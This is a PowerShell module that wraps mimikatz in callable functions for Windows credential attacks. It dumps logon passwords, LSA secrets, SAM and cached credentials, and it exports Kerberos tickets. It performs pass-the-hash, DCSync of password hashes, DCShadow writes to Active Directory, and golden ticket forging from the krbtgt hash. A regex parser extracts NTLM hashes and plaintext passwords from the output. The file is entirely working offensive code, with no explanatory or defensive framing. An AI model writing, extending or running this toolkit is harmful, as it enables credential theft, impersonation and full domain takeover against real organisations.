

function Get-MKLogonPassword {
    mimikatz.exe privilege::debug sekurlsa::logonpasswords exit | ConvertFrom-MKOutput -OutputType LogonPasswords
}

function Get-MKTicket {
    param(
        [Parameter()]
        [Switch]$Export
    )

    $ExportSwitch = ""
    if ($Export) {
        $ExportSwitch = " /export"
    }

    mimikatz.exe privilege::debug "sekurlsa::tickets$ExportSwitch" exit
}

function Invoke-MKPassTheHash {
    param(
        [Parameter(Mandatory)] 
        [string]$User,
        [Parameter(Mandatory)]
        [string]$Domain,
        [Parameter(Mandatory)]
        [string]$NtlmHash,
        [Parameter()]
        [string]$Command = 'powershell'    
        )

    mimikatz.exe privilege::debug "sekurlsa::pth /user:$User /domain:$Domain /ntlm:$NtlmHash /run:$Command" exit
}

function Get-MKKerberosTicket {
    param(
        [Parameter()]
        [Switch]$Export
    )

    $ExportSwitch = ""
    if ($Export) {
        $ExportSwitch = " /export"
    }

    mimikatz.exe privilege::debug "kerberos::list$ExportSwitch" exit
}

function Export-MKKerberosTicket {
    param(
        [Parameter(Mandatory)]
        [string]$FilePath
    )

    mimikatz.exe privilege::debug "kerberos::ptt $FilePath" exit
}

function Grant-MKKerberosGoldenTicket {
    param(
        [Parameter()]
        [string]$User = "Administrator",
        [Parameter()]
        [string]$Domain = (Get-ADDomain | Select-Object -ExpandProperty DNSRoot).Trim(),
        [Parameter()]
        [string]$Sid = (Get-ADDomain | Select-Object -ExpandProperty DomainSID).ToString().Trim(),
        [Parameter()]
        [string]$Id = '500',
        [Parameter()]
        [string[]]$Groups = @('501','502','513','512','520','518','519'),
        [Parameter()]
        [string]$KrbtgtNtlmHash = (Invoke-MKDcSync -User 'krbtgt').HashNTLM.Trim(),
        [Parameter()]
        [string]$TicketPath
    )

    $GroupString = $groups -join ','

    if ($TicketPath) {
        Write-Debug " mimikatz.exe privilege::debug `"kerberos::golden /user:$User /domain:$Domain /sid:$Sid /Id:$Id /rc4:$KrbtgtNtlmHash /groups:$GroupString /ticket:$TicketPath`" exit"

        mimikatz.exe privilege::debug "kerberos::golden /user:$User /domain:$Domain /sid:$Sid /Id:$Id /rc4:$KrbtgtNtlmHash /groups:$GroupString /ticket:$TicketPath" exit   
    } else {

        Write-Debug " mimikatz.exe privilege::debug `"kerberos::golden /user:$User /domain:$Domain /sid:$Sid /Id:$Id /rc4:$KrbtgtNtlmHash /groups:$GroupString /ptt`" exit"

        mimikatz.exe privilege::debug "kerberos::golden /user:$User /domain:$Domain /sid:$Sid  /Id:$Id /rc4:$KrbtgtNtlmHash /groups:$GroupString /ptt" exit
    }
}

function Get-MKCredentialVaultCredential {
    mimikatz.exe privilege::debug token::elevate vault::cred exit
}

function Get-MKCredentialVault {
    mimikatz.exe privilege::debug token::elevate vault::list exit | ConvertFrom-MKOutput -OutputType VaultList
}

function Get-MKLsaSam {
    mimikatz.exe privilege::debug token::elevate lsadump::sam exit | ConvertFrom-MKOutput -OutputType LsadumpSam
}

function Get-MKLsaSecret {
    mimikatz.exe privilege::debug token::elevate lsadump::secrets exit
}

function Get-MKLsaCache {
    mimikatz.exe privilege::debug token::elevate lsadump::cache exit
}

function Invoke-MKDcSync {
    param(
        [Parameter(Mandatory)]
        [string]$UserName,
        [Parameter()]
        [string]$Domain = (Get-ADDomain | Select-Object -ExpandProperty DNSRoot)
    )

    mimikatz.exe privilege::debug "lsadump::dcsync /user:$UserName /domain:$Domain" exit | ConvertFrom-MKOutput -OutputType LsaDumpDcSync
}

function Invoke-MKDcShadow {
    param(
        [Parameter(Mandatory, ParameterSetName = 'push')]   
        [Switch]$Push,
        [Parameter(ParameterSetName = 'rpc')]   
        [string]$Domain = (Get-ADDomain | Select-Object -ExpandProperty RootDns),
        [Parameter(Mandatory, ParameterSetName = 'rpc')]   
        [string]$Object,
        [Parameter(Mandatory, ParameterSetName = 'rpc')]   
        [string]$Attribute,
        [Parameter(Mandatory, ParameterSetName = 'rpc')]   
        [string]$Value
    )

    Begin {
        if ($PSCmdlet.ParameterSetName -eq 'push') {
            mimikatz.exe privilege::debug "lsadump::dcshadow /push" exit
        }
        else {
            $ADObject = Get-ADObject -LDAPFilter "(Name=$Object)"

            Start-Process -FilePath mimikatz.exe -ArgumentList @("!processtoken", "privilege::debug", "`"lsadump::dcshadow /object:$($ADObject.DistinguishedName) /attribute:$attribute /value:$Value`"")
        }
    }
}

  function ConvertFrom-MKOutput {
      param(
          [Parameter(ValueFromPipeline)]
          [string]$Output,
          [Parameter(Mandatory)]
          [ValidateSet("LogonPasswords", "VaultCred", "VaultList", "LsadumpSam", "LsadumpDcSync")]
          [string]$OutputType
      )

      Begin 
      {
        $SB = New-Object -Type System.Text.StringBuilder
      }

      
      Process 
      {
        $SB.AppendLine($Output) | Out-Null
      }

      End 
      {
           switch($OutputType) {
              "LogonPasswords" { $RegEx = '(?:Authentication Id\s+:\s(?<AuthenticationId>.*))[\s\S]*?(?:Session\s+:\s(?<Session>.*))[\s\S]*?(?:User Name\s+:\s(?<UserName>.*))\r*\s*(?:Domain\s+:\s(?<Domain>.*))\r*\s*(?:Logon Server\s+:\s(?<LogonServer>.*))\r*\s*(?:Logon Time\s+:\s(?<LogonTime>.*))\r*\s*(?:SID\s+:\s(?<SID>.*))[\s\S]*?(?:NTLM\s*:\s(?<NTLMHash>.*))?[\s\S]*?(?:SHA1?\s*:\s(?<SHA1Hash>.*))?[\s\S]*?(?:Password\s*:\s(?<Password>.*))'}
              "VaultCred" { $RegEx = '(?:TargetName\s+:\s(?<TargetName>.*))[\s\S]*(?:UserName\s+:\s(?<UserName>.*))[\s\S]*(?:Comment\s+:\s(?<Comment>.*))[\s\S]*(?:Type\s+:\s(?<Type>.*))[\s\S]*(?:Persist\s+:\s(?<Persist>.*))[\s\S]*(?:Flags\s+:\s(?<Flags>.*))[\s\S]*(?:Credential\s+:\s(?<Credential>.*))[\s\S]*(?:Attributes\s+:\s(?<Attributes>.*))'}
              "VaultList" { $RegEx = '(?:Vault\s+:\s(?<Vault>.*))[\s\S]*?(?:\s+Name\s+:\s(?<Name>.*))[\s\S]*?(?:\s+Path\s+:\s(?<Path>.*))' }
              "LsadumpSam" {$RegEx = '(?:Domain\s+:\s(?<Domain>.*))[\s\S]*(?:SysKey\s+:\s(?<SysKey>.*))[\s\S]*(?:Local SID\s+:\s(?<LocalSID>.*))[\s\S]*(?:SAMKey\s+:\s(?<SAMKey>.*))'} 
              "LsadumpDcSync" {$RegEx = '(?:Hash NTLM:\s(?<HashNTLM>.*))'} 
           }

          $SB.ToString() | ConvertTo-Object -Pattern $RegEx
      }
  }
  
  